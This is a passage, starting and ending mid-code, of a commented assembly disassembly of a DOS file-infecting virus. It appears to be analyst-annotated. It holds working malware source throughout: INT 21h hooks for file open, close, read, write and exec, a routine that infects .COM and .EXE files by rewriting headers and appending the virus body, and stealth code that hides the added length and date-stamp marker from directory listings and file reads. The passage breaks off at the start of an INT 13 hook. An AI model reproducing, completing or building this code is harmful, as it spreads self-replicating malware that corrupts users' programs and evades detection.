                mov     ah,27h                  ; '''
                call    sub_24                  ; INT 21
                jmp     loc_13                  ; (0396)
_21_23:         push    cs
                pop     es
                mov     si,dx
                mov     di,offset data_86       ; (CS:12B5=0)
                mov     cx,25h
                rep     movsb                   ; Rep when cx >0 Mov [si] to es:[di]
                push    ds
                push    dx
                push    cs
                pop     ds
                mov     dx,offset data_86       ; CS:12B5
                mov     ah,0Fh
                call    sub_24                  ; INT 21
                mov     ah,10h
                call    sub_24                  ; INT 21
                test    byte ptr data_89,80h    ; (CS:12CA=0)
                pop     si
                pop     ds
                jz      loc_20                  ; Jump if zero
                les     bx,cs:data_88           ; (CS:12C5=0) Load 32 bit ptr
                mov     ax,es
                sub     bx,1000h
                sbb     ax,0
                xor     dx,dx                   ; Zero register
                mov     cx,cs:data_87           ; (CS:12C3=0)
                dec     cx
                add     bx,cx
                adc     ax,0
                inc     cx
                div     cx                      ; ax,dx rem=dx:ax/reg
                mov     [si+23h],ax
                xchg    ax,dx
                xchg    ax,bx
                div     cx                      ; ax,dx rem=dx:ax/reg
                mov     [si+21h],ax
                jmp     loc_13                  ; (0396)
_21_4E_4F:      and     cs:data_85,0FFFEh       ; (CS:12B3=0)
                call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                call    sub_17                  ; Save REGS
                jnc     loc_18                  ; Jump if carry=0
                or      cs:data_85,1            ; (CS:12B3=0)
                jmp     loc_13                  ; (0396)
loc_18:
                call    sub_3                   ; (0581)
                test    byte ptr [bx+19h],80h
                jnz     loc_19                  ; Jump if not zero
                jmp     loc_13                  ; (0396)
loc_19:
                sub     word ptr [bx+1Ah],1000h
                sbb     word ptr [bx+1Ch],0
                sub     byte ptr [bx+19h],0C8h
                jmp     loc_13                  ; (0396)
_21_3C:         push    cx
                and     cx,7
                cmp     cx,7
                je      loc_23                  ; Jump if equal
                pop     cx
                call    sub_13                  ; (0CC6)
                call    sub_24                  ; INT 21
                call    sub_14                  ; (0D6C)
                pushf                           ; Push flags
                cmp     byte ptr cs:data_90,0   ; (CS:12DA=0)
                je      loc_21                  ; Jump if equal
                popf                            ; Pop flags
loc_20:
                jmp     loc_10                  ; (030F)
loc_21:
                popf                            ; Pop flags
                jc      loc_22                  ; Jump if carry Set
                mov     bx,ax
                mov     ah,3Eh                  ; '>'
                call    sub_24                  ; INT 21
                jmp     short _21_3D            ; (0511)
loc_22:
                or      byte ptr cs:data_85,1   ; (CS:12B3=0)
                mov     [bp-4],ax
                jmp     loc_13                  ; (0396)
loc_23:
                pop     cx
                jmp     loc_10                  ; (030F)
_21_3D:
                call    sub_9                   ; Get PSP segment
                call    sub_8                   ; (0925)
                jc      loc_26                  ; Jump if carry Set
                cmp     byte ptr cs:data_76,0   ; (CS:12A2=0)
                je      loc_26                  ; Jump if equal
                call    sub_10                  ; (097E)
                cmp     bx,0FFFFh
                je      loc_26                  ; Jump if equal
                dec     cs:data_76              ; (CS:12A2=0)
                push    cs
                pop     es
                mov     di,offset data_75       ; (CS:1252=0)
                mov     cx,14h
                xor     ax,ax                   ; Zero register
                repne   scasw                   ; Rep zf=0+cx >0 Scan es:[di] for ax
                mov     ax,cs:data_77           ; (CS:12A3=0)
                mov     es:[di-2],ax
                mov     es:[di+26h],bx
                mov     [bp-4],bx
loc_25:
                and     byte ptr cs:data_85,0FEh        ; (CS:12B3=0)
                jmp     loc_13                  ; (0396)
loc_26:
                jmp     loc_10                  ; (030F)
_21_3E:         push    cs
                pop     es
                call    sub_9                   ; Get PSP segment
                mov     di,offset data_75       ; (CS:1252=0)
                mov     cx,14h
                mov     ax,cs:data_77           ; (CS:12A3=0)
loc_27:
                repne   scasw                   ; Rep zf=0+cx >0 Scan es:[di] for ax
                jnz     loc_28                  ; Jump if not zero
                cmp     bx,es:[di+26h]
                jne     loc_27                  ; Jump if not equal
                mov     word ptr es:[di-2],0
                call    sub_4                   ; (0793) - infect file
                inc     cs:data_76              ; (CS:12A2=0)
                jmp     short loc_25            ; (0549)
loc_28:
                jmp     loc_10                  ; (030F)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_3           proc    near
                push    es
                mov     ah,2Fh                  ; '/'
                call    sub_24                  ; INT 21
                push    es
                pop     ds
                pop     es
                retn
sub_3           endp

_21_4B:         or      al,al                   ; Zero ?
                jz      loc_29                  ; Jump if zero
                jmp     loc_36                  ; (06E0)
loc_29:
                push    ds
                push    dx
                mov     cs:prm_blck_adr,bx      ; (CS:1224) save EXEC block offset
                mov     word ptr cs:prm_blck_adr+2,es ; (CS:1226) save EXEC block segment
                lds     si,dword ptr cs:prm_blck_adr  ; (CS:1224) Load EXEC block address
                mov     di,offset exec_block     ; (CS:12F1)
                mov     cx,0Eh
                push    cs
                pop     es
                rep     movsb                   ; Save EXEC param block
                pop     si
                pop     ds
                mov     di,offset file_name     ; (CS:1307)
                mov     cx,50h
                rep     movsb                   ; Save file name
                mov     bx,0FFFFh
                call    sub_23                  ; (0E3A)
                call    sub_19                  ; Restore REGS
                pop     bp
                pop     cs:data_98              ; (CS:12E6=0)
                pop     cs:data_99              ; (CS:12E8=0)
                pop     cs:data_85              ; (CS:12B3=0)
                mov     ax,4B01h
                push    cs
                pop     es
                mov     bx,offset exec_block
                pushf                           ; Push flags
                call    dword ptr cs:ptr_INT_21 ; (CS:1235=0)
                jnc     loc_30                  ; Jump if carry=0
                or      cs:data_85,1            ; (CS:12B3=0)
                push    cs:data_85              ; (CS:12B3=0)
                push    cs:data_99              ; (CS:12E8=0)
                push    cs:data_98              ; (CS:12E6=0)
                push    bp
                mov     bp,sp
                les     bx,dword ptr cs:prm_blck_adr ; (CS:1224=0) Load 32 bit ptr
                jmp     loc_11                  ; (033F)
loc_30:
                call    sub_9                   ; Get PSP segment
                push    cs
                pop     es
                mov     di,offset data_75       ; (CS:1252=0)
                mov     cx,14h
loc_31:
                mov     ax,cs:data_77           ; (CS:12A3=0)
                repne   scasw                   ; Rep zf=0+cx >0 Scan es:[di] for ax
                jnz     loc_32                  ; Jump if not zero
                mov     word ptr es:[di-2],0
                inc     cs:data_76              ; (CS:12A2=0)
                jmp     short loc_31            ; (060B)
loc_32:
                lds     si,cs:entry_point       ; (CS:1303=0) Load 32 bit ptr
                cmp     si,1                    ; already infected?
                jne     loc_33                  ; Jump if not equal
                mov     dx,word ptr ds:data_29+2 ; (0000:001A) - original entry point segment
                add     dx,10h
                mov     ah,51h
                call    sub_24                  ; INT 21 - get PSP segment
                add     dx,bx
                mov     word ptr cs:entry_point+2,dx ; (CS:1305=0)
                push    word ptr ds:data_29     ; (0000:0018) - original entry point offset
                pop     word ptr cs:entry_point ; (CS:1303=0)
                add     bx,10h
                add     bx,ds:data_27           ; (0000:0012) - original SS:
                mov     cs:data_107,bx          ; (CS:1301=0)
                push    word ptr ds:data_28     ; (0000:0014) - original SP
                pop     cs:data_106             ; (CS:12FF=0)
                jmp     short loc_34            ; (067F)
loc_33:
                mov     ax,[si]
                add     ax,[si+2]
                add     ax,[si+4]
                jz      loc_35                  ; Jump if zero
                push    cs
                pop     ds
                mov     dx,offset file_name
                call    sub_8                   ; (0925)
                call    sub_10                  ; (097E)
                inc     cs:data_103             ; (CS:12EF=0)
                call    sub_4                   ; infect file
                dec     cs:data_103             ; (CS:12EF=0)
loc_34:
                mov     ah,51h
                call    sub_24                  ; INT 21
                call    sub_21                  ; Save REGS in vir's stack
                call    sub_16                  ; (0D9B)
                call    sub_18                  ; (0DBA)
                call    sub_20                  ; Restore REGS from vir's stack
                mov     ds,bx
                mov     es,bx
                push    cs:data_85              ; (CS:12B3=0)
                push    cs:data_99              ; (CS:12E8=0)
                push    cs:data_98              ; (CS:12E6=0)
                pop     word ptr ds:PSP_0A      ; offset 0A in PSP
                pop     word ptr ds:PSP_0A+2    ; offset 0C in PSP
                push    ds
                lds     dx,dword ptr ds:PSP_0A  ; offset 0A in PSP - terminate address
                mov     al,22h
                call    sub_27                  ; Set INT 22 vector
                pop     ds
                popf                            ; Pop flags
                pop     ax
                mov     ss,cs:data_107          ; (CS:1301=0)
                mov     sp,cs:data_106          ; (CS:12FF=0)
                jmp     dword ptr cs:entry_point ; (CS:1303=0)
loc_35:
                mov     bx,[si+1]
                mov     ax,ds:[bx+si+sav_file]   ; (0000:FD9F)
                mov     [si],ax
                mov     ax,ds:[bx+si+sav_file+2] ; (0000:FDA1)
                mov     [si+2],ax
                mov     ax,ds:[bx+si+sav_file+4] ; (0000:FDA3)
                mov     [si+4],ax
                jmp     short loc_34            ; (067F)
loc_36:
                cmp     al,1
                je      loc_37                  ; Jump if equal
                jmp     loc_10                  ; (030F)
loc_37:
                or      cs:data_85,1            ; (CS:12B3=0)
                mov     cs:prm_blck_adr,bx      ; (CS:1224=0)
                mov     word ptr cs:prm_blck_adr+2,es ; (CS:1226=7DBDh)
                call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                call    sub_17                  ; Save REGS
                les     bx,dword ptr cs:prm_blck_adr    ; (CS:1224) Load EXEC param block address
                lds     si,dword ptr es:[bx+12h]        ; Load CS:IP from EXEC parameter block
                jc      loc_40                          ; Jump if carry Set
                and     byte ptr cs:data_85,0FEh        ; (CS:12B3=0)
                cmp     si,1                    ; infected .EXE ?
                je      loc_38                  ; Jump if equal
                mov     ax,[si]
                add     ax,[si+2]
                add     ax,[si+4]
                jnz     loc_39                  ; Jump if not zero
                mov     bx,[si+1]
                mov     ax,ds:[bx+si+sav_file]  ; (013B:FD9F) saved original file
                mov     [si],ax
                mov     ax,ds:[bx+si+sav_file+2] ; (013B:FDA1) saved original file
                mov     [si+2],ax
                mov     ax,ds:[bx+si+sav_file+4] ; (013B:FDA3) saved original file
                mov     [si+4],ax
                jmp     short loc_39            ; (0765)
loc_38:
                mov     dx,word ptr ds:data_29+2        ; (013B:001A=2E09h)
                call    sub_9                   ; Get PSP segment
                mov     cx,cs:data_77           ; (CS:12A3) - PSP segment
                add     cx,10h
                add     dx,cx
                mov     es:[bx+14h],dx
                mov     ax,word ptr ds:data_29  ; (013B:0018=7332h)
                mov     es:[bx+12h],ax
                mov     ax,ds:data_27           ; (013B:0012=2E08h)
                add     ax,cx
                mov     es:[bx+10h],ax
                mov     ax,ds:data_28           ; (013B:0014=3E80h)
                mov     es:[bx+0Eh],ax
loc_39:
                call    sub_9                   ; Get PSP segment
                mov     ds,cs:data_77           ; (CS:12A3=0)
                mov     ax,[bp+2]
                mov     ds:PSP_0A,ax            ; (0000:000A=0F000h)
                mov     ax,[bp+4]
                mov     word ptr ds:PSP_0A+2,ax ; (0000:000C=7F6h)
loc_40:
                jmp     loc_13                  ; (0396)
_21_30:         mov     byte ptr cs:data_104,0  ; (CS:12F0=0)
                mov     ah,2Ah
                call    sub_24                  ; INT 21
                cmp     dx,916h
                jb      loc_41                  ; Jump if below
                call    sub_28                  ; (0FB2)
loc_41:
                jmp     loc_10                  ; (030F)

;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                    SUBROUTINE - INFECTION
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_4           proc    near
                call    sub_13                  ; (0CC6)
                call    sub_5                   ; (0855)
                mov     byte ptr data_31,1      ; (CS:0020=0)
                cmp     data_38,5A4Dh           ; (CS:1200=0)
                je      loc_42                  ; Jump if equal
                cmp     data_38,4D5Ah           ; (CS:1200=0)
                je      loc_42                  ; Jump if equal
                dec     byte ptr data_31        ; (CS:0020=0)
                jz      loc_45                  ; Jump if zero
loc_42:
; .EXE file infect
                mov     ax,data_41              ; (CS:1204=0)
                shl     cx,1                    ; Shift w/zeros fill
                mul     cx                      ; dx:ax = reg * ax
                add     ax,200h
                cmp     ax,si
                jb      loc_44                  ; Jump if below
                mov     ax,data_43              ; (CS:120A=0)
                or      ax,data_44              ; (CS:120C=0)
                jz      loc_44                  ; Jump if zero
                mov     ax,data_80              ; (CS:12A9=0)
                mov     dx,data_81              ; (CS:12AB=0)
                mov     cx,200h
                div     cx                      ; ax,dx rem=dx:ax/reg
                or      dx,dx                   ; Zero ?
                jz      loc_43                  ; Jump if zero
                inc     ax
loc_43:
                mov     data_41,ax              ; (CS:1204=0)
                mov     data_40,dx              ; (CS:1202=0)
                cmp     data_48,1               ; (CS:1214=0)
                je      loc_46                  ; Jump if equal
                mov     data_48,1               ; (CS:1214=0)
                mov     ax,si
                sub     ax,data_42              ; (CS:1208=0)
                mov     data_49,ax              ; (CS:1216=0)
                add     data_41,8               ; (CS:1204=0)
                mov     data_45,ax              ; (CS:120E=0)
                mov     data_46,1000h           ; (CS:1210=0) BUG BUG BUG!!!
                                                ; When .EXE file is infected,
                                                ; the end of the virus wil be
                                                ; damaged. (sp = 1000)
                call    sub_6                   ; (08B3)
loc_44:
                jmp     short loc_46            ; (084C)
loc_45:
; .COM file infect
                cmp     si,0F00h                ; file len in paragraphs
                jae     loc_46                  ; Jump if above or =
                mov     ax,data_38              ; (CS:1200=0)
                mov     data_23,ax              ; (CS:0004=20CDh)
                add     dx,ax
                mov     ax,data_40              ; (CS:1202=0)
                mov     data_24,ax              ; (CS:0006=340h)
                add     dx,ax
                mov     ax,data_41              ; (CS:1204=0)
                mov     data_25,ax              ; (CS:0008=50C6h)
                add     dx,ax
                jz      loc_46                  ; Jump if zero - allready infected
                mov     cl,0E9h
                mov     byte ptr data_38,cl     ; (CS:1200=0)
                mov     ax,10h
                mul     si                      ; dx:ax = reg * ax
                add     ax,265h
                mov     word ptr data_38+1,ax   ; (CS:1201=0)
                mov     ax,data_38              ; (CS:1200=0)
                add     ax,data_40              ; (CS:1202=0)
                neg     ax
                mov     data_41,ax              ; (CS:1204=0)
                call    sub_6                   ; (08B3)
loc_46:
                mov     ah,3Eh                  ; '>'
                call    sub_24                  ; INT 21
                call    sub_14                  ; (0D6C)
                retn
sub_4           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_5           proc    near
                push    cs
                pop     ds
                mov     ax,5700h
                call    sub_24                  ; INT 21
                mov     data_53,cx              ; (CS:1229=0)
                mov     data_54,dx              ; (CS:122B=0)
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                call    sub_24                  ; INT 21
                mov     ah,3Fh                  ; '?'
                mov     cl,1Ch
                mov     dx,1200h
                call    sub_24                  ; INT 21
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                call    sub_24                  ; INT 21
                mov     ah,3Fh                  ; '?'
                mov     cl,1Ch
                mov     dx,4
                call    sub_24                  ; INT 21
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                call    sub_24                  ; INT 21
                mov     data_80,ax              ; (CS:12A9=0)
                mov     data_81,dx              ; (CS:12AB=0)
                mov     di,ax
                add     ax,0Fh
                adc     dx,0
                and     ax,0FFF0h
                sub     di,ax
                mov     cx,10h
                div     cx                      ; ax,dx rem=dx:ax/reg
                mov     si,ax
                retn
sub_5           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_6           proc    near
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                call    sub_24                  ; INT 21
                mov     ah,40h
                mov     cl,1Ch
                mov     dx,1200h
                call    sub_24                  ; INT 21
                mov     ax,10h
                mul     si                      ; dx:ax = reg * ax
                mov     cx,dx
                mov     dx,ax
                mov     ax,4200h
                call    sub_24                  ; INT 21
                xor     dx,dx                   ; Zero register
                mov     cx,1000h
                add     cx,di
                mov     ah,40h
                call    sub_24                  ; INT 21
                mov     ax,5701h
                mov     cx,data_53              ; (CS:1229=0)
                mov     dx,data_54              ; (CS:122B=0)
                test    dh,80h
                jnz     loc_47                  ; Jump if not zero
                add     dh,0C8h
loc_47:         call    sub_24                  ; INT 21
                cmp     byte ptr dos_ver,3      ; (CS:12EE=0)
                jb      loc_ret_48              ; Jump if below
                cmp     byte ptr data_103,0     ; (CS:12EF=0)
                je      loc_ret_48              ; Jump if equal
                push    bx
                mov     dl,data_52              ; (CS:1228=0)
                mov     ah,32h
                call    sub_24                  ; INT 21
                mov     ax,cs:data_101          ; (CS:12EC=0)
                mov     [bx+1Eh],ax
                pop     bx
loc_ret_48:
                retn
sub_6           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_7           proc    near
                call    sub_21                  ; Save REGS in vir's stack
                mov     di,dx
                add     di,0Dh
                push    ds
                pop     es
                jmp     short loc_50            ; (0945)
sub_7           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_8           proc    near
                call    sub_21                  ; Save REGS in vir's stack - save REGS
                push    ds
                pop     es
                mov     di,dx
                mov     cx,50h
                xor     ax,ax                   ; Zero register
                mov     bl,0
                cmp     byte ptr [di+1],3Ah     ; ':'
                jne     loc_49                  ; Jump if not equal
                mov     bl,[di]
                and     bl,1Fh
loc_49:
                mov     cs:data_52,bl           ; (CS:1228=0)
                repne   scasb                   ; Rep zf=0+cx >0 Scan es:[di] for al
loc_50:
                mov     ax,[di-3]
                and     ax,0DFDFh
                add     ah,al
                mov     al,[di-4]
                and     al,0DFh
                add     al,ah
                mov     byte ptr cs:data_31,0   ; (CS:0020=0)
                cmp     al,0DFh                 ; file name is ....COM
                je      loc_51                  ; Jump if equal
                inc     byte ptr cs:data_31     ; (CS:0020=0)
                cmp     al,0E2h                 ; file name is ....EXE
                jne     loc_52                  ; Jump if not equal
loc_51:
                call    sub_20                  ; Restore regs from vir's stack
                clc                             ; Clear carry flag
                retn
loc_52:
                call    sub_20                  ; Restore regs from vir's stack
                stc                             ; Set carry flag
                retn
sub_8           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_9           proc    near
                push    bx
                mov     ah,51h
                call    sub_24                  ; INT 21
                mov     cs:data_77,bx           ; (CS:12A3=0)
                pop     bx
                retn
sub_9           endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_10          proc    near
                call    sub_13                  ; (0CC6)
                push    dx
                mov     dl,cs:data_52           ; (CS:1228=0)
                mov     ah,36h                  ; '6'
                call    sub_24                  ; INT 21
                mul     cx                      ; dx:ax = reg * ax
                mul     bx                      ; dx:ax = reg * ax
                mov     bx,dx
                pop     dx
                or      bx,bx                   ; Zero ?
                jnz     loc_53                  ; Jump if not zero
                cmp     ax,4000h
                jb      loc_54                  ; Jump if below
loc_53:
                mov     ax,4300h
                call    sub_24                  ; INT 21
                jc      loc_54                  ; Jump if carry Set
                mov     di,cx
                xor     cx,cx                   ; Zero register
                mov     ax,4301h
                call    sub_24                  ; INT 21
                cmp     byte ptr cs:data_90,0   ; (CS:12DA=0)
                jne     loc_54                  ; Jump if not equal
                mov     ax,3D02h
                call    sub_24                  ; INT 21
                jc      loc_54                  ; Jump if carry Set
                mov     bx,ax
                mov     cx,di
                mov     ax,4301h
                call    sub_24                  ; INT 21
                push    bx
                mov     dl,cs:data_52           ; (CS:1228=0)
                mov     ah,32h                  ; '2'
                call    sub_24                  ; INT 21
                mov     ax,[bx+1Eh]
                mov     cs:data_101,ax          ; (CS:12EC=0)
                pop     bx
                call    sub_14                  ; (0D6C)
                retn
loc_54:
                xor     bx,bx                   ; Zero register
                dec     bx
                call    sub_14                  ; (0D6C)
                retn
sub_10          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_11          proc    near
                push    cx
                push    dx
                push    ax
                mov     ax,4400h
                call    sub_24                  ; INT 21
                xor     dl,80h
                test    dl,80h
                jz      loc_55                  ; Jump if zero
                mov     ax,5700h
                call    sub_24                  ; INT 21
                test    dh,80h
loc_55:
                pop     ax
                pop     dx
                pop     cx
                retn
sub_11          endp


;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;                              SUBROUTINE
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

sub_12          proc    near
                call    sub_21                  ; Save REGS in vir's stack
                mov     ax,4201h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_24                  ; INT 21
                mov     cs:data_78,ax           ; (CS:12A5=0)
                mov     cs:data_79,dx           ; (CS:12A7=0)
                mov     ax,4202h
                xor     cx,cx                   ; Zero register
                xor     dx,dx                   ; Zero register
                call    sub_24                  ; INT 21
                mov     cs:data_80,ax           ; (CS:12A9=0)
                mov     cs:data_81,dx           ; (CS:12AB=0)
                mov     ax,4200h
                mov     dx,cs:data_78           ; (CS:12A5=0)
                mov     cx,cs:data_79           ; (CS:12A7=0)
                call    sub_24                  ; INT 21
                call    sub_20                  ; Restore regs from vir's stack
                retn
sub_12          endp

_21_57:         or      al,al                   ; Zero ?
                jnz     loc_58                  ; Jump if not zero
                and     cs:data_85,0FFFEh       ; (CS:12B3=0)
                call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                jc      loc_57                  ; Jump if carry Set
                test    dh,80h
                jz      loc_56                  ; Jump if zero
                sub     dh,0C8h
loc_56:
                jmp     loc_11                  ; (033F)
loc_57:
                or      cs:data_85,1            ; (CS:12B3=0)
                jmp     loc_11                  ; (033F)
loc_58:
                cmp     al,1
                jne     loc_61                  ; Jump if not equal
                and     cs:data_85,0FFFEh       ; (CS:12B3=0)
                test    dh,80h
                jz      loc_59                  ; Jump if zero
                sub     dh,0C8h
loc_59:
                call    sub_11                  ; (09E6)
                jz      loc_60                  ; Jump if zero
                add     dh,0C8h
loc_60:
                call    sub_24                  ; INT 21
                mov     [bp-4],ax
                adc     cs:data_85,0            ; (CS:12B3=0)
                jmp     loc_13                  ; (0396)
_21_42:         cmp     al,2
                jne     loc_61                  ; Jump if not equal
                call    sub_11                  ; (09E6)
                jz      loc_61                  ; Jump if zero
                sub     word ptr [bp-0Ah],1000h
                sbb     word ptr [bp-8],0
loc_61:
                jmp     loc_10                  ; (030F)
_21_3F:         and     byte ptr cs:data_85,0FEh        ; (CS:12B3=0)
                call    sub_11                  ; (09E6)
                jz      loc_61                  ; Jump if zero
                mov     cs:data_83,cx           ; (CS:12AF=0)
                mov     cs:data_82,dx           ; (CS:12AD=0)
                mov     cs:data_84,0            ; (CS:12B1=0)
                call    sub_12                  ; (0A04)
                mov     ax,cs:data_80           ; (CS:12A9=0)
                mov     dx,cs:data_81           ; (CS:12AB=0)
                sub     ax,1000h
                sbb     dx,0
                sub     ax,cs:data_78           ; (CS:12A5=0)
                sbb     dx,cs:data_79           ; (CS:12A7=0)
                jns     loc_62                  ; Jump if not sign
                mov     word ptr [bp-4],0
                jmp     loc_25                  ; (0549)
loc_62:
                jnz     loc_63                  ; Jump if not zero
                cmp     ax,cx
                ja      loc_63                  ; Jump if above
                mov     cs:data_83,ax           ; (CS:12AF=0)
loc_63:
                mov     dx,cs:data_78           ; (CS:12A5=0)
                mov     cx,cs:data_79           ; (CS:12A7=0)
                or      cx,cx                   ; Zero ?
                jnz     loc_64                  ; Jump if not zero
                cmp     dx,1Ch
                jbe     loc_65                  ; Jump if below or =
loc_64:
                mov     dx,cs:data_82           ; (CS:12AD=0)
                mov     cx,cs:data_83           ; (CS:12AF=0)
                mov     ah,3Fh                  ; '?'
                call    sub_24                  ; INT 21
                add     ax,cs:data_84           ; (CS:12B1=0)
                mov     [bp-4],ax
                jmp     loc_13                  ; (0396)
loc_65:
                mov     si,dx
                mov     di,dx
                add     di,cs:data_83           ; (CS:12AF=0)
                cmp     di,1Ch
                jb      loc_66                  ; Jump if below
                xor     di,di                   ; Zero register
                jmp     short loc_67            ; (0B35)
loc_66:
                sub     di,1Ch
                neg     di
loc_67:
                mov     ax,dx
                mov     cx,cs:data_81           ; (CS:12AB=0)
                mov     dx,cs:data_80           ; (CS:12A9=0)
                add     dx,0Fh
                adc     cx,0
                and     dx,0FFF0h
                sub     dx,0FFCh
                sbb     cx,0
                add     dx,ax
                adc     cx,0
                mov     ax,4200h
                call    sub_24                  ; INT 21
                mov     cx,1Ch
                sub     cx,di
                sub     cx,si
                mov     ah,3Fh                  ; '?'
                mov     dx,cs:data_82           ; (CS:12AD=0)
                call    sub_24                  ; INT 21
                add     cs:data_82,ax           ; (CS:12AD=0)
                sub     cs:data_83,ax           ; (CS:12AF=0)
                add     cs:data_84,ax           ; (CS:12B1=0)
                xor     cx,cx                   ; Zero register
                mov     dx,1Ch
                mov     ax,4200h
                call    sub_24                  ; INT 21
                jmp     loc_64                  ; (0B04)
_21_40:         and     byte ptr cs:data_85,0FEh        ; (CS:12B3=0)
                call    sub_11                  ; (09E6)
                jnz     loc_68                  ; Jump if not zero
                jmp     loc_61                  ; (0AA2)
loc_68:
                mov     cs:data_83,cx           ; (CS:12AF=0)
                mov     cs:data_82,dx           ; (CS:12AD=0)
                mov     cs:data_84,0            ; (CS:12B1=0)
                call    sub_12                  ; (0A04)
                mov     ax,cs:data_80           ; (CS:12A9=0)
                mov     dx,cs:data_81           ; (CS:12AB=0)
                sub     ax,1000h
                sbb     dx,0
                sub     ax,cs:data_78           ; (CS:12A5=0)
                sbb     dx,cs:data_79           ; (CS:12A7=0)
                js      loc_69                  ; Jump if sign=1
                jmp     short loc_71            ; (0C47)
loc_69:
                call    sub_13                  ; (0CC6)
                push    cs
                pop     ds
                mov     dx,data_80              ; (CS:12A9=0)
                mov     cx,data_81              ; (CS:12AB=0)
                add     dx,0Fh
                adc     cx,0
                and     dx,0FFF0h
                sub     dx,0FFCh
                sbb     cx,0
                mov     ax,4200h
                call    sub_24                  ; INT 21
                mov     dx,4
                mov     cx,1Ch
                mov     ah,3Fh                  ; '?'
                call    sub_24                  ; INT 21
                mov     ax,4200h
                xor     cx,cx                   ; Zero register
                mov     dx,cx
                call    sub_24                  ; INT 21
                mov     dx,4
                mov     cx,1Ch
                mov     ah,40h                  ; '@'
                call    sub_24                  ; INT 21
                mov     dx,0F000h
                mov     cx,0FFFFh
                mov     ax,4202h
                call    sub_24                  ; INT 21
                mov     ah,40h                  ; '@'
                xor     cx,cx                   ; Zero register
                call    sub_24                  ; INT 21
                mov     dx,data_78              ; (CS:12A5=0)
                mov     cx,data_79              ; (CS:12A7=0)
                mov     ax,4200h
                call    sub_24                  ; INT 21
                mov     ax,5700h
                call    sub_24                  ; INT 21
                test    dh,80h
                jz      loc_70                  ; Jump if zero
                sub     dh,0C8h
                mov     ax,5701h
                call    sub_24                  ; INT 21
loc_70:
                call    sub_14                  ; (0D6C)
                jmp     loc_10                  ; (030F)
loc_71:
                jnz     loc_72                  ; Jump if not zero
                cmp     ax,cx
                ja      loc_72                  ; Jump if above
                jmp     loc_69                  ; (0BC9)
loc_72:
                mov     dx,cs:data_78           ; (CS:12A5=0)
                mov     cx,cs:data_79           ; (CS:12A7=0)
                or      cx,cx                   ; Zero ?
                jnz     loc_73                  ; Jump if not zero
                cmp     dx,1Ch
                ja      loc_73                  ; Jump if above
                jmp     loc_69                  ; (0BC9)
loc_73:
                call    sub_19                  ; Restore REGS
                call    sub_24                  ; INT 21
                call    sub_17                  ; Save REGS
                mov     ax,5700h
                call    sub_24                  ; INT 21
                test    dh,80h
                jnz     loc_74                  ; Jump if not zero
                add     dh,0C8h
                mov     ax,5701h
                call    sub_24                  ; INT 21
loc_74:         jmp     loc_13                  ; (0396)
                jmp     loc_10                  ; (030F)

int_13:         pop     word ptr cs:data_65     ; (CS:1241=0)
                pop     word ptr cs:data_65+2   ; (CS:1243=0)
                pop     cs:data_91              ; (CS:12DB=0)
